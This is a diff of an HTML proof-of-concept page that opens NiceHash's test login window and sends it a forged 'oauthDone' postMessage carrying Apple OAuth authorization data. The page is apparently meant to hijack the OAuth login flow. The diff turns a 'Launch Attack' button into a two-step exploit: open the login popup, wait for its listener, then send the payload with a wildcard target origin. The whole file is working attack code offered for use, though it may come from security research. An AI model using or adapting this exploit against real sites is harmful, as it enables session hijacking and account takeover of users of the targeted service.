@@ -1,20 +1,28 @@
-  <!DOCTYPE html>
+ <!DOCTYPE html>
   <html>
   <body>
-  <button onclick="attack()">Launch Attack</button>
-  <div id="log"></div>
+  <button onclick="openTarget()">Step 1: Open NiceHash Login</button>
+  <button onclick="attack()" id="btn2" disabled>Step 2: Send Payload</button>
+  <pre id="log"></pre>
+
   <script>
-  let nhWin;
+  let nhWin = null;
 
   function openTarget() {
     nhWin = window.open('https://test.nicehash.com/my/login', 'nhLogin',
-      'width=600,height=700');
-    log('NiceHash login opened from: ' + window.location.origin);
+      'width=600,height=700,left=100,top=100');
+    if (!nhWin) { log('POPUP BLOCKED — allow popups for this page'); return; }
+    log('[+] Opened NiceHash login from: ' + window.location.origin);
+    log('[+] Waiting 4s for listener to register...');
+    setTimeout(() => {
+      document.getElementById('btn2').disabled = false;
+      log('[+] Ready — click Step 2');
+    }, 4000);
   }
 
   function attack() {
-    // Paste fresh code + id_token here
-    const applePayload = {
+    if (!nhWin) { log('[-] No window ref — click Step 1 first'); return; }
+    const payload = {
       method: 'oauthDone',
       data: {
         authorization: {
@@ -24,18 +32,14 @@
         }
       }
     };
-
-    nhWin.postMessage(JSON.stringify(applePayload), '*');
-    log('[SENT] postMessage from ' + window.location.origin + ' → NiceHash');
-    log('Check NiceHash window Network tab for apple-callback response');
+    nhWin.postMessage(JSON.stringify(payload), '*');
+    log('[+] postMessage sent from ' + window.location.origin);
+    log('[+] Check NiceHash window → DevTools → Network → apple-callback');
   }
 
   function log(msg) {
-    document.getElementById('log').innerHTML += '<p>' + msg + '</p>';
+    document.getElementById('log').textContent += msg + '\n';
   }
-
-  // Auto-open on load
-  openTarget();
   </script>
   </body>
   </html>
